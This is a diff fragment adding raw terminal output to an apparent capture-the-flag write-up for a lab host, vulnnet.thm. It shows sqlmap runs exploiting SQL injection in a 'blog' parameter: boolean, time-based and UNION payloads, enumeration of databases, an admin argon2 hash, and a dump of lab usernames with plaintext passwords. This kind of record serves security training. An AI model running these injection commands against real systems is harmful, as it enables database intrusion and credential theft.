@@ -418,3 +418,424 @@ Parameter: blog (GET)
 
     Type: UNION query
     Title: Generic UNION query (NULL) - 3 columns
+    Payload: blog=-9227 UNION ALL SELECT NULL,NULL,CONCAT(0x7170717a71,0x52636969624361636476664b62614565724d6f7a6f6c5076736e4671786c5176655467614b574e51,0x7170707871)-- -
+---
+[14:01:36] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 18.04 (bionic)
+web application technology: Apache 2.4.29
+back-end DBMS: MySQL >= 5.0.12
+[14:01:36] [INFO] fetching database names
+available databases [3]:
+[*] blog
+[*] information_schema
+[*] vn_admin
+
+[14:01:36] [INFO] fetching columns for table 'be_users' in database 'vn_admin'
+[14:01:36] [WARNING] reflective value(s) found and filtering out
+Database: vn_admin
+Table: be_users
+[34 columns]
++-----------------------+----------------------+
+| Column                | Type                 |
++-----------------------+----------------------+
+| admin                 | smallint(5) unsigned |
+| allowed_languages     | varchar(255)         |
+| avatar                | int(10) unsigned     |
+| category_perms        | text                 |
+| crdate                | int(10) unsigned     |
+| createdByAction       | int(11)              |
+| cruser_id             | int(10) unsigned     |
+| db_mountpoints        | text                 |
+| deleted               | smallint(5) unsigned |
+| description           | text                 |
+| disable               | smallint(5) unsigned |
+| disableIPlock         | smallint(5) unsigned |
+| email                 | varchar(255)         |
+| endtime               | int(10) unsigned     |
+| file_mountpoints      | text                 |
+| file_permissions      | text                 |
+| lang                  | varchar(6)           |
+| lastlogin             | int(10) unsigned     |
+| lockToDomain          | varchar(50)          |
+| options               | smallint(5) unsigned |
+| password              | varchar(100)         |
+| pid                   | int(10) unsigned     |
+| realName              | varchar(80)          |
+| starttime             | int(10) unsigned     |
+| TSconfig              | text                 |
+| tstamp                | int(10) unsigned     |
+| uc                    | mediumblob           |
+| uid                   | int(10) unsigned     |
+| usergroup             | varchar(255)         |
+| usergroup_cached_list | text                 |
+| userMods              | text                 |
+| username              | varchar(50)          |
+| workspace_id          | int(11)              |
+| workspace_perms       | smallint(6)          |
++-----------------------+----------------------+
+
+[14:01:36] [INFO] fetched data logged to text files under '/home/witty/.local/share/sqlmap/output/api.vulnnet.thm'
+
+[*] ending @ 14:01:36 //
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ sqlmap -u "http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=5" --dbs --batch --random-agent --threads=10 -D vn_admin -T be_users -C admin,email,username,password --dump
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.7.2#stable}
+|_ -| . ["]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 14:12:05 //
+
+[14:12:05] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.202.0 Safari/532.0' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
+[14:12:06] [INFO] resuming back-end DBMS 'mysql' 
+[14:12:06] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: blog (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: blog=5 AND 5223=5223
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: blog=5 AND (SELECT 9248 FROM (SELECT(SLEEP(5)))reeW)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: blog=-9227 UNION ALL SELECT NULL,NULL,CONCAT(0x7170717a71,0x52636969624361636476664b62614565724d6f7a6f6c5076736e4671786c5176655467614b574e51,0x7170707871)-- -
+---
+[14:12:07] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 18.04 (bionic)
+web application technology: Apache 2.4.29
+back-end DBMS: MySQL >= 5.0.12
+[14:12:07] [INFO] fetching database names
+available databases [3]:
+[*] blog
+[*] information_schema
+[*] vn_admin
+
+[14:12:07] [INFO] fetching entries of column(s) 'admin,email,password,username' for table 'be_users' in database 'vn_admin'
+[14:12:07] [WARNING] reflective value(s) found and filtering out
+Database: vn_admin
+Table: be_users
+[1 entry]
++-------+---------------------+----------+---------------------------------------------------------------------------------------------------+
+| admin | email               | username | password                                                                                          |
++-------+---------------------+----------+---------------------------------------------------------------------------------------------------+
+| 1     | chris_w@vulnnet.thm | chris_w  | $argon2i$v=19$m=65536,t=16,p=2$UnlVSEgyMUFnYnJXNXlXdg$j6z3IshmjsN+CwhciRECV2NArQwipqQMIBtYufyM4Rg |
++-------+---------------------+----------+---------------------------------------------------------------------------------------------------+
+
+[14:12:07] [INFO] table 'vn_admin.be_users' dumped to CSV file '/home/witty/.local/share/sqlmap/output/api.vulnnet.thm/dump/vn_admin/be_users.csv'
+[14:12:07] [INFO] fetched data logged to text files under '/home/witty/.local/share/sqlmap/output/api.vulnnet.thm'
+
+[*] ending @ 14:12:07 //
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ cat vulnnet_hash
+$argon2i$v=19$m=65536,t=16,p=2$UnlVSEgyMUFnYnJXNXlXdg$j6z3IshmjsN+CwhciRECV2NArQwipqQMIBtYufyM4Rg
+
+let's see the others tables
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ sqlmap -u "http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=5" --dbs --batch --random-agent --threads=10 -D blog --tables
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.7.2#stable}
+|_ -| . [)]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 14:21:30 //
+
+[14:21:30] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux x86_64; cs-CZ; rv:1.9.0.4) Gecko/2008111318 Ubuntu/8.04 (hardy) Firefox/3.0.4' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
+[14:21:31] [INFO] resuming back-end DBMS 'mysql' 
+[14:21:31] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: blog (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: blog=5 AND 5223=5223
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: blog=5 AND (SELECT 9248 FROM (SELECT(SLEEP(5)))reeW)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: blog=-9227 UNION ALL SELECT NULL,NULL,CONCAT(0x7170717a71,0x52636969624361636476664b62614565724d6f7a6f6c5076736e4671786c5176655467614b574e51,0x7170707871)-- -
+---
+[14:21:32] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 18.04 (bionic)
+web application technology: Apache 2.4.29
+back-end DBMS: MySQL >= 5.0.12
+[14:21:32] [INFO] fetching database names
+available databases [3]:
+[*] blog
+[*] information_schema
+[*] vn_admin
+
+[14:21:32] [INFO] fetching tables for database: 'blog'
+[14:21:32] [WARNING] reflective value(s) found and filtering out
+Database: blog
+[4 tables]
++------------+
+| blog_posts |
+| details    |
+| metadata   |
+| users      |
++------------+
+
+[14:21:32] [INFO] fetched data logged to text files under '/home/witty/.local/share/sqlmap/output/api.vulnnet.thm'
+
+[*] ending @ 14:21:32 //
+
+                                                                                                                                                  
+┌──(witty㉿kali)-[~/Downloads]
+└─$ sqlmap -u "http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=5" --dbs --batch --random-agent --threads=10 -D blog -T users --columns
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.7.2#stable}
+|_ -| . [,]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 14:21:53 //
+
+[14:21:53] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.0.3) Gecko/2008092510 Ubuntu/8.04 (hardy) Firefox/3.0.3' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
+[14:21:53] [INFO] resuming back-end DBMS 'mysql' 
+[14:21:53] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: blog (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: blog=5 AND 5223=5223
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: blog=5 AND (SELECT 9248 FROM (SELECT(SLEEP(5)))reeW)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: blog=-9227 UNION ALL SELECT NULL,NULL,CONCAT(0x7170717a71,0x52636969624361636476664b62614565724d6f7a6f6c5076736e4671786c5176655467614b574e51,0x7170707871)-- -
+---
+[14:21:54] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 18.04 (bionic)
+web application technology: Apache 2.4.29
+back-end DBMS: MySQL >= 5.0.12
+[14:21:54] [INFO] fetching database names
+available databases [3]:
+[*] blog
+[*] information_schema
+[*] vn_admin
+
+[14:21:54] [INFO] fetching columns for table 'users' in database 'blog'
+[14:21:54] [WARNING] reflective value(s) found and filtering out
+Database: blog
+Table: users
+[3 columns]
++----------+-------------+
+| Column   | Type        |
++----------+-------------+
+| id       | int(11)     |
+| password | varchar(50) |
+| username | varchar(50) |
++----------+-------------+
+
+[14:21:54] [INFO] fetched data logged to text files under '/home/witty/.local/share/sqlmap/output/api.vulnnet.thm'
+
+[*] ending @ 14:21:54 //
+
+                                                                                                                                                  
+┌──(witty㉿kali)-[~/Downloads]
+└─$ sqlmap -u "http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=5" --dbs --batch --random-agent --threads=10 -D blog -T users -C username,password --dump
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.7.2#stable}
+|_ -| . [.]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 14:22:13 //
+
+[14:22:13] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
+[14:22:13] [INFO] resuming back-end DBMS 'mysql' 
+[14:22:13] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: blog (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: blog=5 AND 5223=5223
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: blog=5 AND (SELECT 9248 FROM (SELECT(SLEEP(5)))reeW)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: blog=-9227 UNION ALL SELECT NULL,NULL,CONCAT(0x7170717a71,0x52636969624361636476664b62614565724d6f7a6f6c5076736e4671786c5176655467614b574e51,0x7170707871)-- -
+---
+[14:22:14] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 18.04 (bionic)
+web application technology: Apache 2.4.29
+back-end DBMS: MySQL >= 5.0.12
+[14:22:14] [INFO] fetching database names
+available databases [3]:
+[*] blog
+[*] information_schema
+[*] vn_admin
+
+[14:22:14] [INFO] fetching entries of column(s) 'password,username' for table 'users' in database 'blog'
+[14:22:14] [WARNING] reflective value(s) found and filtering out
+Database: blog
+Table: users
+[651 entries]
++--------------------+---------------------+
+| username           | password            |
++--------------------+---------------------+
+[14:22:15] [WARNING] console output will be trimmed to last 256 rows due to large table size
+| lspikinsaz         | D8Gbl8mnxg          |
+| profeb0            | kLLxorKfd           |
+| sberrymanb1        | cdXAJAR             |
+| ajefferiesb2       | 0hdeFiZBRJ          |
+| hkibblewhiteb3     | 6rl6qXSJDrr         |
+| dtremayneb4        | DuYMuI              |
+| bflewinb5          | fwbk0Vgo            |
+| kmolineuxb6        | 92Fb3vBF5k75        |
+| fjosefsb7          | zzh9wheBjX          |
+| tmiskellyb8        | sAGTlyBrb5r         |
+| nallrightb9        | 3uUPdL              |
+| hlevermoreba       | fp2LW0x             |
+| celgerbb           | IKhg7D              |
+| frustedbc          | Tjyu2Ch2            |
+| imeneghibd         | NgKgdeKRVEK         |
+| vgouninbe          | wGWMg3d             |
+| cbartoschbf        | ruTxBc2n85          |
+| lcordonbg          | ZydELwZFV2          |
+| dappsbh            | ROfVmvZSYS          |
+| zduchanbi          | B4SBGt5yAD          |
+| jfraybj            | zhE95JJX9l          |
+| mlanchesterbk      | nXSVHhVW9S          |
+| cgylesbl           | NCeU070             |
+| cbonnifacebm       | WzkvfoedkXJx        |
+| btoppasbn          | ktPBpK1             |
+| mdurrettbo         | 8fCXE6BF9gj         |
+| skilroybp          | cSAjOy              |
+| uvonderemptenbq    | HLUHZ9oQ            |
+| dvinsenbr          | gTc7TiSsd2          |
+| ltiltbs            | 7yQ0b1B             |
+| dsimcoebt          | SXD1eC6ysa          |
+| wfrailbu           | bgb084kq            |
+| lmityukovbv        | NsJFz4DLpI          |
+| vkellarbw          | 7JVPatN             |
+| rkingstonbx        | yuTnSPEvIoJ4        |
+| rbakewellby        | L3ttm8              |
+| dbousteadbz        | vyae6t              |
+| vstaddenc0         | iA4AD4UlcLF1        |
+| rwhacketc1         | VlyIAh              |
+| tnoorc2            | IpsnIEbIaT          |
+| dduffync3          | UPU9rZu8q           |
+| dstichelc4         | xuUXUFXoc           |
+| kcleverlyc5        | yTuqouj9ZK          |
+| sreinertc6         | QDneobZ1DH          |
+| mcottinghamc7      | OdrnoHtrP           |
+| ljansemac8         | c3KvR6              |
+| acodac9            | GMbFP9              |
+| rhuggardca         | zIZ11OPuj           |
+| gkeechcb           | XCX2GVx             |
+| syurincc           | nJQgYR2uOyZq        |
+| agaulecd           | AQlFlPvf            |
+| wboijce            | zj6vR6Bf            |
+| kphifercf          | eL5uJnLD2           |
+| abenglecg          | 7HEMdTc07           |
+| emarkingch         | VbzVZoYn            |
+| nmuldowneyci       | wln8WN3PJ           |
+| jbygrovecj         | 3AcKBTHRN           |
+| bduxburyck         | 32ZXql9Uw8          |
+| fthewcl            | 2pnBsk6i            |
+| kmeececm           | JxcEXKAN            |
+| bholligancn        | rkyCMLwOIt          |
+| bferonetco         | KlxQ4Vxl            |
+| jcraycp            | OFc5f2              |
+| hethertoncq        | SsLMTxbw            |
+| cclayecr           | nUpdnCZW1cqr        |
+| tmcbreartycs       | 0I7ldSNbm           |
+| oderuggieroct      | gqQeawiZ            |
+| rdoerscu           | djQBjW3pk           |
+| karbucklecv        | G9FarmKd            |
+| bbuckbycw          | lXCoFI              |
+| ldixseecx          | WAMRuFTTI3          |
+| jmahedycy          | diVq6PDeEpz         |
+| gdamrellcz         | bV6cXPOFfLg         |
+| sgarrettd0         | dCrF5fv             |
+| plaurenceaud1      | Q4gYmlM             |
+| kmcgeacheyd2       | SnvFrSB6AB          |
+| mhopewelld3        | qiehVyQ             |
+| chottond4          | At9A4aCJos          |
+| hsellandd5         | 8T9v08352re         |
+| syegorkovd6        | y8chyGC9js          |
+| adavisond7         | ghMz6e68c1Z         |
+| amewisd8           | 00S7q8S1f8W         |
+| lorpind9           | 2rruluVz0SwY        |
+| jbilovskyda        | hXaVYfHUZoz         |
+| jhalforddb         | j7GAP4v             |
+| wcolisbedc         | 0MM46yTEVBL2        |
+| cgreastydd         | QUDViFUxO           |
+| ajackde            | YGcBpM              |
+| cmcgarritydf       | 2js9AM              |
+| tjostdg            | oJ38KUXgm           |
+| lguidendh          | KP9DmIk             |
+| mbletsodi          | qNYURfhw            |
+| wsneesbydj         | jDmbnZJi            |
+| glerouxdk          | t8xlAuAvH8Yj        |
+| yhaythornthwaitedl | TTin1up             |
+| nzmitrovichdm      | 0ftVkbqP            |
+| jgodballdn         | Kwcozh              |
+| jkiddeydo          | TWnwDTB             |
+| acaghandp          | IxQgXLrw            |
+| rattestonedq       | AxuOsAA0lqrc        |
+| mmichallatdr       | GCpyVf              |
+| rgaitoneds         | YnPCjKg             |
+| krobbekedt         | NOYhOlnC            |
+| nknollerdu         | pjSBcAVD            |
+| wshemeltdv         | 5RigTGe             |
+| rpeperelldw        | jwKMTMu             |
+| lbescobydx         | 4qfwbKNed3I         |
+| jparishdy          | qSX9N1Kf8XJ         |
+| jminghidz          | AoIrka              |
+| nforthe0           | Ft4xVROXXCd5        |
+| tklemensiewicze1   | x3WIaoX99yb         |
+| epotterye2         | hXcrFv              |
+| lbrugmanne3        | 6ZtJhp4col          |
+| adencse4           | bqItfg4wf           |
+| cfloreze5          | 5W4lM81DPo          |
+| amatanine6         | IT6p5HT             |
+| fchalkere7         | 0Q6T9jvAZB          |
+| rytere8            | M7lvtAz6oRNS        |
+| cstillee9          | MpO7FgPoz           |
+| cbashamea          | 8rIuhW0VZ           |
+| flyeseb            | OS15i4              |
+| gtieryec           | Usl7mH2H            |
+| sborgheseed        | WDAliOAKFj7f        |
+| hmctrustyee        | iwpk0YC             |
+| wvigeref           | lN8d6g1             |
+| nbockeneg          | nuwPbeTIgX8F        |
+| ffranzmaneh        | LvBDyc9JRPV         |
+| drippingaleei      | ncpiXJX             |
+| achambersej        | vQUTz2xEyWx4        |
+| fsuarezek          | wQcbURC             |
+| kaspoleel          | irTEDl2k            |
+| mmursellem         | H6WyTMdy            |
